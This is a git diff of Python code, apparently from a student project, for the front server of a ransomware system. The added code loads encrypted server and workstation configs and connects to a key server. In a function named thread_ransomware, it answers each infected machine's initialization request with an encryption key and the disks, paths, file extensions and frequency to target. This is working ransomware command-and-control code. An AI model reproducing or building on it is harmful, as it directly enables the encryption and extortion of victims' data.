@@ -3,7 +3,7 @@ import utile.security as security
 import queue
 import socket
 from threading import Thread
-import utile.configgetter as config
+import utile.config as configg
 import utile.message as message
 from utile.network import recv_msg, send_msg, recv_msg_clear, send_msg_clear
 
@@ -20,6 +20,12 @@ class serveur_frontal(object):
         self.port = port
 
     def start_server(self):
+        global config_serveur
+        global config_workstation
+        configg.load_config("C:/Users/coren/PycharmProjects/UE14-1IS4-Groupe1/serveur_frontale/configs/config.json", "C:/Users/coren/PycharmProjects/UE14-1IS4-Groupe1/serveur_frontale/configs/config.key")
+        self.ip_cles, self.port_cles = configg.get_data_config("ip_cles"), configg.get_data_config("port_cles")
+        config_serveur = configg.load_config('C:/Users/coren/PycharmProjects/UE14-1IS4-Groupe1/serveur_frontale/configs/server.json', 'C:/Users/coren/PycharmProjects/UE14-1IS4-Groupe1/serveur_frontale/configs/server.key')
+        config_workstation = configg.load_config('C:/Users/coren/PycharmProjects/UE14-1IS4-Groupe1/serveur_frontale/configs/workstation.json', 'C:/Users/coren/PycharmProjects/UE14-1IS4-Groupe1/serveur_frontale/configs/workstation.key')
         queue_messages_receiv = queue.Queue()
         thread_s_cles = Thread(target=self.thread_srv_cles, args=(queue_messages_receiv,))
         thread_s_cles.start()
@@ -46,7 +52,7 @@ class serveur_frontal(object):
 
     def thread_srv_cles(self, q_messages_receiv):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((config.get_ip("config.json"), config.get_port("config.json")))
+        s.connect((self.ip_cles, self.port_cles))
 
         key_f = security.diffie_hellman_recv_key(s)
         q_messages_receiv.put('CONN_SRV_CLES')
@@ -65,6 +71,8 @@ class serveur_frontal(object):
 
 
     def thread_ransomware(self, c_v, queue_messages_receiv, queue_victim):
+        global config_serveur
+        global config_workstation
         while True:
             msg = recv_msg_clear(c_v)
             if "INITIALIZE_REQ" in msg:
@@ -78,3 +86,16 @@ class serveur_frontal(object):
                 msg['queue'] = queue_victim
                 queue_messages_receiv.put(msg)
                 key_rsp = queue_victim.get()
+                if msg['OS'] == 'SERVEUR':
+                    config_ransomware = config_serveur
+                else:
+                    config_ransomware = config_workstation
+                msg = message.get_message('initialize_resp', [
+                    key_rsp['KEY_RESP'],
+                    config_ransomware['DISKS'],
+                    config_ransomware['PATHS'],
+                    config_ransomware['FILE_EXT'],
+                    config_ransomware['FREQ'],
+                    key_rsp['KEY']
+                ])
+                send_msg_clear(c_v, msg)
